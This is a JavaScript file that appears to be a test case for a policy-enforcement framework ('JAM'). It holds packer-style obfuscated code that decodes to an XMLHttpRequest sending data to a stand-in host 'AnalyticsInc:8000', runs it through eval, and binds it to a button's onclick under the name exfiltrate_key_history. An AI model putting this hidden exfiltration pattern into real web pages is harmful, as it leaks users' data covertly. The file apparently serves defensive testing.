function exfiltrate_key_history() {
  function v3(_0x9e37x1, _0x9e37x2, _0x9e37x3, _0x9e37x4, _0x9e37x5, _0x9e37x6) {
    function v2() {
      return _0x1636[6]
    }
    function v1(_0x9e37x5$$1) {
      introspect(JAM.policy.p1) {
        return _0x9e37x6[_0x9e37x5$$1]
      }
    }
    function v0(_0x9e37x3$$1) {
      return _0x9e37x3$$1.toString(36)
    }
    _0x9e37x5 = v0;
    var v21 = _0x1636[5];
    if(!JAM.call(JAM.get(v21, _0x1636[4], JAM.policy.p1), v21, [/^/, String])) {
      var v6 = _0x9e37x3;
      _0x9e37x3 = _0x9e37x3 - 1;
      for(;v6;) {
        var v4 = _0x9e37x6;
        var v5 = _0x9e37x3.toString(_0x9e37x2);
        introspect(JAM.policy.p1) {
          var v16 = _0x9e37x4[_0x9e37x3]
        }
        if(!v16) {
          v16 = _0x9e37x3.toString(_0x9e37x2)
        }
        JAM.set(v4, v5, v16);
        v6 = _0x9e37x3;
        _0x9e37x3 = _0x9e37x3 - 1
      }
      _0x9e37x4 = [v1];
      _0x9e37x5 = v2;
      _0x9e37x3 = 1
    }
    var v12 = _0x9e37x3;
    _0x9e37x3 = _0x9e37x3 - 1;
    for(;v12;) {
      introspect(JAM.policy.p1) {
        var v11 = _0x9e37x4[_0x9e37x3]
      }
      if(v11) {
        var v8 = _0x1636[4];
        var v9 = new RegExp(_0x1636[7] + JAM.call(_0x9e37x5, null, [_0x9e37x3]) + _0x1636[7], _0x1636[8]);
        introspect(JAM.policy.p1) {
          var v10 = _0x9e37x4[_0x9e37x3]
        }
        _0x9e37x1 = JAM.call(JAM.get(_0x9e37x1, v8, JAM.policy.p1), _0x9e37x1, [v9, v10])
      }
      v12 = _0x9e37x3;
      _0x9e37x3 = _0x9e37x3 - 1
    }
    return _0x9e37x1
  }
  var _0x1636 = ['0=5 4();0.7("3","1://2:6/8.d?c=b",9);0.a(e);', "|", "split", "xmlhttp|http|AnalyticsInc|GET|XMLHttpRequest|new|8000|open|submission|true|send|multi|test|html|null", "replace", "", "\\w+", "\\b", "g"];
  var v19 = _0x1636[0];
  var v26 = _0x1636[3];
  var v13 = v3(v19, 15, 15, JAM.call(JAM.get(v26, _0x1636[2], JAM.policy.p1), v26, [_0x1636[1]]), 0, {});
  if(JAM.isEval(eval)) {
    eval("introspect(JAM.policy.pFull) { " + v13 + " }")
  }else {
    JAM.call(eval, null, [v13])
  }
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history);

